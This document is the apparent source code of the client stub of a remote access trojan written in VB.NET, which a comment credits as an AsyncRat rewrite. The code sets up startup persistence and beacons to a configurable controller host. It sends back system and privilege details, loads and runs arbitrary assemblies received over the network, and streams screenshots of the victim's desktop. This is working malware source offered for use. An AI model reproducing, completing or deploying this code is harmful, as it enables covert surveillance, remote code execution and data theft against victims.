Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.Globalization
Imports System.Net
Imports System.Net.Sockets
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.Security.Principal
Imports System.Threading
Imports System.Threading.Tasks
Imports System.Runtime.InteropServices
Imports PacketLib.Packet
Imports System.Drawing.Imaging
Imports System.Drawing
Imports System.Windows.Forms
Imports System.Drawing.Drawing2D

Public Class C
    Public Shared Function CheckDNS()
        Dim l As IPAddress() = Dns.GetHostAddresses(H)

        For Each IP In l
            If IP.AddressFamily = Sockets.AddressFamily.InterNetwork Then
                Return IP.ToString
            End If
        Next
    End Function
    Private Shared T As TcpClient = New TcpClient()

    Public Shared H As String = "127.0.0.1"
    Public Shared P As String = "5900"

    Public Shared Install_D As String = "%I1%"
    Public Shared Install_T As String = "%TIME%"
    Public Shared Install_N As String = "%NAME%"


    Public Shared Sub Check()

        Dim b As Byte() = System.Text.Encoding.UTF8.GetBytes("")
        While True

            Thread.Sleep(1000)

            Try

                T.GetStream.Write(b, 0, b.Length)

            Catch ex As Exception

                Try
                    T = New TcpClient

                    T.Connect(IPAddress.Parse(CheckDNS()), Integer.Parse(P))

                    If T.Connected = True Then
                        Dim N As NetworkStream = T.GetStream()
                        Dim O As New Threading.Thread(Sub() R(N))
                        O.Start()
                    End If

                Catch ex

                End Try


            End Try

        End While
    End Sub

    Public Shared Sub Main()

        If Install_D = "True" Then

            Dim O As New Options.Options(Install_N)

            Options.Options.StartUp(Install_T)

        End If

        Options.Options.OneInstance()

        SetCurrentDirectoryA(IO.Path.GetTempPath) ''To write file later
        SetPriorityClass(Process.GetCurrentProcess.Handle, dwPriorityClass.ABOVE_NORMAL_PRIORITY_CLASS Or dwPriorityClass.PROCESS_MODE_BACKGROUND_BEGIN)
        'SetProcessPriorityBoost(Process.GetCurrentProcess.Handle, False)
        SetThreadExecutionState(EXECUTION_STATE.ES_CONTINUOUS Or EXECUTION_STATE.ES_DISPLAY_REQUIRED Or EXECUTION_STATE.ES_SYSTEM_REQUIRED Or EXECUTION_STATE.ES_AWAYMODE_REQUIRED)


        Try

            T.Connect(IPAddress.Parse(CheckDNS()), Integer.Parse(P))

            If T.Connected = True Then
                Dim N As NetworkStream = T.GetStream()
                Dim O As New Threading.Thread(Sub() R(N))
                O.Start()
            End If

        Catch ex As Exception


            While T.Connected = False


                Try
                    T.Connect(IPAddress.Parse(CheckDNS), Integer.Parse(P))

                    If T.Connected = True Then
                        Dim N As NetworkStream = T.GetStream()
                        Dim O As New Threading.Thread(Sub() R(N))
                        O.Start()
                    End If

                Catch exs As Exception

                End Try
            End While

        End Try

        Dim Checker_ As New Thread(Sub() Check())

        Checker_.Start()
    End Sub
    Public Shared Sub R(ByVal L As NetworkStream)


        Try

            While True

                Dim sf As BinaryFormatter = New BinaryFormatter()
                Dim packet As PacketMaker = CType(sf.Deserialize(L), PacketMaker)

                Select Case packet.Type_Packet

                    Case PacketType.ID

                        Dim I As New Microsoft.VisualBasic.Devices.Computer

                        Dim D As New List(Of String) From {
                                I.Info.OSFullName,
                                Environment.UserName,
                                I.Info.OSVersion,
                                RegionInfo.CurrentRegion.Name & " - " & RegionInfo.CurrentRegion.EnglishName,
                                Process.GetCurrentProcess.Handle,
                                Privilege(),
                                Check64Bit()
                            }


                        Dim P As New PacketMaker With {
                                .Type_Packet = PacketType.ID,
                                .Misc = D.ToArray
                            }

                        SyncLock T
                            sf.Serialize(L, P)
                        End SyncLock



                    Case PacketType.PLUGIN

                        '  Await Task.Run(Sub() Launch(T, packet.Plugin, packet.Function_Params))
                        '   Dim THR As New Thread(Sub() Launch(T, packet.Plugin, packet.Function_Params))

                        '  THR.Start()
                        Launch(T, packet.Plugin, packet.Function_Params, False)

                    Case PacketType.PLUGIN_C

                        Launch(T, packet.Plugin, packet.Function_Params, True)

                    Case PacketType.CLOSE

                        NtTerminateProcess(Process.GetCurrentProcess.Handle, 0)

                    Case PacketType.U_CLOSE

                        Dim O As New Options.Options(Install_N)

                        Options.Options.U_StartUp()

                    Case PacketType.RD


                        Dim O As Object() = packet.Function_Params

                        'Dim THR As New Thread(Sub() Capture(O(0), O(1), O(2), O(3)))
                        '  THR.Start()
                        '     Await Task.Run(Sub() Capture(O(0), O(1), O(2), O(3)))
                        Capture(O(0), O(1), O(2), O(3))
                End Select
                SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
                EmptyWorkingSet(Process.GetCurrentProcess.Handle)
            End While

        Catch ex As Exception

        End Try

    End Sub



    Private Shared Function Check64Bit() As String
        If Environment.Is64BitProcess Then
            Return "64"
        Else
            Return "32"
        End If
    End Function
    Private Shared Function Privilege() As String
        Dim ID = WindowsIdentity.GetCurrent()

        Dim principal = New WindowsPrincipal(ID)

        If principal.IsInRole(WindowsBuiltInRole.Administrator) Then

            Return "Admin"
        Else
            Return "User"
        End If

    End Function

    Private Shared Function GetEncoderInfo(ByVal format As ImageFormat) As ImageCodecInfo
        Try
            Dim j As Integer
            Dim encoders() As ImageCodecInfo
            encoders = ImageCodecInfo.GetImageEncoders()

            j = 0
            While j < encoders.Length
                If encoders(j).FormatID = format.Guid Then
                    Return encoders(j)
                End If
                j += 1
            End While
            Return Nothing
        Catch ex As Exception
        End Try
    End Function

    Public Shared Async Sub Launch(ByVal k As TcpClient, ByVal B As Byte(), ByVal P As Object(), ByVal CSharp As Boolean)
        'Use synlock to avoid sending packet at same time and make collisions
        'Please do not use Async for this sub otherwise it will work partially lol
        '   SyncLock T

        Try

            Dim assemblytoload As System.Reflection.Assembly = System.Reflection.Assembly.Load(B)
            Dim method As System.Reflection.MethodInfo
            If CSharp = False Then
                method = assemblytoload.[GetType]("PL.Main").GetMethod("Main")
            Else

                method = assemblytoload.[GetType]("PL.Main").GetMethod("main")
            End If


            Dim obj As Object = assemblytoload.CreateInstance(method.Name)

            Await Task.Run(Sub() method.Invoke(obj, New Object() {k, P}))
            '
            '   method.Invoke(obj, New Object() {k, P})

            ' End SyncLock

        Catch ex As Exception

        End Try
        GC.Collect()
        GC.WaitForPendingFinalizers()
        SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
        EmptyWorkingSet(Process.GetCurrentProcess.Handle)
    End Sub
    ''Comes from AsyncRat VBNET rewritten by Arsium
    Public Shared Sub Capture(ByVal W As Integer, ByVal H As Integer, ByVal Q As Integer, ByVal F As String)

        Try

            Dim img As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)

            Dim graphics As Graphics = Graphics.FromImage(img)

            graphics.CompositingQuality = Drawing2D.CompositingQuality.HighSpeed


            graphics.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)

            Dim P As New Point

            GetCursorPos(P)

            Dim CS As New CURSORINFOHELPER

            CS.cbSize = Marshal.SizeOf(CS)

            GetCursorInfo(CS)

            If CS.flags = &H1 Then ''SO IMPORTANT TO CHECK IF CURSOR IS NOT HIDDEN ! Else will crash without error message
                '
                graphics.DrawIcon(Icon.FromHandle(CS.hCursor), P.X, P.Y)

            End If

            Dim Resize As New Bitmap(W, H)
            Dim g2 As Graphics = Graphics.FromImage(Resize)
            g2.CompositingQuality = CompositingQuality.HighSpeed
            g2.DrawImage(img, New Rectangle(0, 0, W, H), New Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), GraphicsUnit.Pixel)

            Dim encoderParameter As EncoderParameter = New EncoderParameter(Imaging.Encoder.Quality, Q)
            Dim encoderInfo As ImageCodecInfo

            If F = "PNG" Then

                encoderInfo = GetEncoderInfo(ImageFormat.Png)

            ElseIf F = "JPEG" Then

                encoderInfo = GetEncoderInfo(ImageFormat.Jpeg)

            ElseIf F = "GIF" Then

                encoderInfo = GetEncoderInfo(ImageFormat.Gif)

            End If

            Dim encoderParameters As EncoderParameters = New EncoderParameters(1)
            encoderParameters.Param(0) = encoderParameter

            Dim MS As New IO.MemoryStream
            Resize.Save(MS, encoderInfo, encoderParameters)



            Dim packet As New PacketMaker With {
                    .Misc = New Object() {MS.ToArray},
                    .Type_Packet = PacketType.RD
               }

            Dim Send As New Packet_Send With {
                    .Packet = packet
            }

            SyncLock T
                Send.Send(T.GetStream)
            End SyncLock

            graphics.Dispose()
            g2.Dispose()
            img.Dispose()
            Resize.Dispose()
            MS.Dispose()
            encoderParameter.Dispose()
            encoderParameters.Dispose()

        Catch ex As Exception
        End Try

    End Sub

    <DllImport("user32.dll")>
    Public Shared Function GetCursorInfo(ByRef pci As CURSORINFOHELPER) As Boolean
    End Function

    <DllImport("user32.dll")>
    Public Shared Function GetCursorPos(<Out> ByRef lpPoint As Point) As Boolean
    End Function

    <StructLayout(LayoutKind.Sequential)>
    Structure CURSORINFOHELPER

        Public cbSize As Int32

        Public flags As Int32

        Public hCursor As IntPtr

        Public ptScreenPos As Point

    End Structure

    <DllImport("kernel32.dll", SetLastError:=True)>
    Public Shared Function SetThreadExecutionState(ByVal esFlags As EXECUTION_STATE) As EXECUTION_STATE
    End Function

    Public Enum EXECUTION_STATE As UInteger

        ES_CONTINUOUS = &H80000000UI

        ES_DISPLAY_REQUIRED = &H2

        ES_SYSTEM_REQUIRED = &H1

        ES_AWAYMODE_REQUIRED = &H40

    End Enum

    <DllImport("KernelBase.dll", SetLastError:=True)>
    Public Shared Function SetPriorityClass(ByVal handle As IntPtr, ByVal dwPriorityClass As dwPriorityClass) As Boolean
    End Function

    Public Enum dwPriorityClass As UInteger

        ABOVE_NORMAL_PRIORITY_CLASS = &H8000

        BELOW_NORMAL_PRIORITY_CLASS = &H4000

        HIGH_PRIORITY_CLASS = &H80

        REALTIME_PRIORITY_CLASS = &H100

        NORMAL_PRIORITY_CLASS = &H20

        PROCESS_MODE_BACKGROUND_BEGIN = &H100000

        IDLE_PRIORITY_CLASS = &H40

    End Enum

    ' <DllImport("kernel32.dll", SetLastError:=True)>
    'Public Shared Function SetProcessPriorityBoost(ByVal handle As IntPtr, ByVal bDisablePriorityBoost As Boolean) As Boolean
    'End Function

    <DllImport("kernel32.dll", SetLastError:=True)>
    Public Shared Function SetCurrentDirectoryA(ByVal path As String) As Boolean
    End Function

    Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (ByVal process As IntPtr, ByVal minimumWorkingSetSize As Integer, ByVal maximumWorkingSetSize As Integer) As Integer

    <DllImport("psapi")>
    Public Shared Function EmptyWorkingSet(ByVal hfandle As IntPtr) As Boolean
    End Function

    Private Declare Function NtTerminateProcess Lib "ntdll.dll" (hfandle As IntPtr, ErrorStatus As Integer) As UInteger
End Class
